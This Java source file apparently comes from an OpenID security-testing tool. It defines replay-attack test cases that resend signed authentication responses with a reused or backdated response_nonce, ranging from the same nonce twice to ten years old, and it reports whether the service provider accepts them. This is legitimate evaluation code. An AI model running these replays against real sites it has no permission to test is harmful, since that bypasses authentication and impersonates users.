/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package wsattacker.sso.openid.attacker.evaluation.attack;

import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult;
import wsattacker.sso.openid.attacker.evaluation.attack.Attack;
import wsattacker.sso.openid.attacker.evaluation.attack.AbstractAttack;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.SimpleTimeZone;
import org.apache.commons.lang3.RandomStringUtils;
import wsattacker.sso.openid.attacker.attack.parameter.AttackParameter;
import wsattacker.sso.openid.attacker.attack.parameter.utilities.HttpMethod;
import wsattacker.sso.openid.attacker.config.OpenIdServerConfiguration;
import wsattacker.sso.openid.attacker.evaluation.LoginResult;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Interpretation;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Result;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider.User;

/**
 *
 * @author christiankossmann
 */
public class ReplayAttack extends AbstractAttack {

    public ReplayAttack(ServiceProvider serviceProvider) {
        super(serviceProvider);
    }
   
    @Attack(number = 0)
    private AttackResult performSameResponseNonceAttack() {
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);
        
        String description = "The same timestamp and nonce in two consecutive "
                + "Authentication Responses.";
        
        // current time in utc
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'");
        dateFormat.setTimeZone(new SimpleTimeZone(SimpleTimeZone.UTC_TIME, "UTC"));
        String timestamp = dateFormat.format(new Date()) + RandomStringUtils.random(8, true, true);;
        
        // set response_nonce
        AttackParameter responseNonceParameter = keeper.getParameter("openid.response_nonce");
        responseNonceParameter.setAttackValueUsedForSignatureComputation(true);
        responseNonceParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        responseNonceParameter.setAttackMethod(HttpMethod.GET);
        responseNonceParameter.setAttackValue(timestamp);

        // include modified response_nonce in signature
        AttackParameter sigParameter = keeper.getParameter("openid.sig");
        sigParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParameter.setAttackMethod(HttpMethod.GET);

        // two logins
        LoginResult loginResult = serviceProvider.login(User.ATTACKER);
        LoginResult loginResult2 = serviceProvider.loginAndDetermineAuthenticatedUser(User.ATTACKER);

        boolean success = loginResult2.getAuthenticatedUser() == User.ATTACKER;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        if (loginResult2.hasDirectVerification() && success) {
            result = Result.NOT_PERFORMABLE;
            interpretation = Interpretation.NEUTRAL;
        }
        
        assert isSignatureValid(loginResult2) : "Signature is not valid!";
        
        loginResult2.addLogEntriesAtStart(loginResult.getLogEntries());

        return new AttackResult(description, loginResult2, result, interpretation);
    }
    
    private String generateResponseNonceOfCurrentDateMinus(int years, int days, int hours) {
        Calendar calendar = Calendar.getInstance();
        calendar.setTime(new Date());
        calendar.add(Calendar.HOUR_OF_DAY, (0 - hours));
        calendar.add(Calendar.DAY_OF_YEAR, (0 - days));
        calendar.add(Calendar.YEAR, (0 - years));

        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'");
        dateFormat.setTimeZone(new SimpleTimeZone(SimpleTimeZone.UTC_TIME, "UTC"));
        String timestamp = dateFormat.format(calendar.getTime());

        String randomString = RandomStringUtils.random(8, true, true);
        return timestamp + randomString;
    }
    
    private AttackResult performReplayAttackWithResponseNonce(String responseNonce, String description) {
        AttackParameter responseNonceParameter = keeper.getParameter("openid.response_nonce");
        responseNonceParameter.setAttackValueUsedForSignatureComputation(true);
        responseNonceParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        responseNonceParameter.setAttackMethod(HttpMethod.GET);
        responseNonceParameter.setAttackValue(responseNonce);

        // include modified parameter in signature
        AttackParameter sigParameter = keeper.getParameter("openid.sig");
        sigParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParameter.setAttackMethod(HttpMethod.GET);
        
        LoginResult loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(User.ATTACKER);

        boolean success = loginResult.getAuthenticatedUser() == User.ATTACKER;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        if (loginResult.hasDirectVerification() && success) {
            interpretation = Interpretation.RESTRICTED;
        }
        
        assert isSignatureValid(loginResult) : "Signature is not valid!";
        
        return new AttackResult(description, loginResult, result, interpretation);
    }
    
    @Attack(number=1)
    private AttackResult performReplayAttackWithTenYearOldToken() {
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);
        
        String description = "Replay of Authentication Response after 10 years.";    
        String responseNonce = generateResponseNonceOfCurrentDateMinus(10, 0, 0);
        
        return performReplayAttackWithResponseNonce(responseNonce, description);
    }
    
    @Attack(number=2, dependsOnFailureOf = 1)
    private AttackResult performReplayAttackWithOneDayOldToken() {
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);
        
        String description = "Replay of Authentication Response after 1 day.";    
        String responseNonce = generateResponseNonceOfCurrentDateMinus(0, 1, 0);
        
        return performReplayAttackWithResponseNonce(responseNonce, description);
    }
    
    @Attack(number=3, dependsOnFailureOf = 2)
    private AttackResult performReplayAttackWithSixHourOldToken() {
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);
        
        String description = "Replay of Authentication Response after 6 hours.";    
        String responseNonce = generateResponseNonceOfCurrentDateMinus(0, 0, 6);
        
        return performReplayAttackWithResponseNonce(responseNonce, description);
    }
    
    @Attack(number=4, dependsOnFailureOf = 3)
    private AttackResult performReplayAttackWithOneHourOldToken() {
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);
        
        String description = "Replay of Authentication Response after 1 hour.";    
        String responseNonce = generateResponseNonceOfCurrentDateMinus(0, 0, 1);
        
        return performReplayAttackWithResponseNonce(responseNonce, description);
    }
}
